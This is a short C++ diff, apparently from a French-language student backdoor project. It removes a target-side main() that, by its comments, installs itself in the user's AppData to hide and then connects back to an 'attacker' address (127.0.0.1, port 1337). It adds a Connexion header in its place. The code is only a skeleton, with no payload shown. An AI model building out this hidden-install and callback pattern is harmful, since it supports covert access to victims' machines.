@@ -1,23 +1,25 @@
-#include "installationAndStart.h"
-#include "Connexion.h"
+//
+// Created by Berlingot on 2023-04-20.
+//
+
+#ifndef SERVEUR___CIBLE_CONNEXION_H
+#define SERVEUR___CIBLE_CONNEXION_H
+#include "../MyPNet/IncludeMe.h"
+#include "string"
+#include <chrono>
+#include <thread>
 
 
-const char * adresseipPirate = "127.0.0.1";
-const unsigned short portPirate = 1337;
+class Connexion {
+private:
+    MyPNet::Socket socket;
+public:
+    Connexion(const char * adresseIP, unsigned short port);
 
-int main(){ // Main client -- cible
-// installation dans appdata du l'utilisateur -- pour le cacher
-    if(installationAndStart::init() != OperationState::OP_Success){ // launch init et s'assure du s
-        //todo implémantation d'un problème lors de l'installation
-        std::cerr << "Problème lors de l'installation";
-    }
+};
 
-    //Loop de connection
 
-    Connexion connexion(adresseipPirate, portPirate);
-
-    return 0;
-}
+#endif //SERVEUR___CIBLE_CONNEXION_H
 
 
 /*
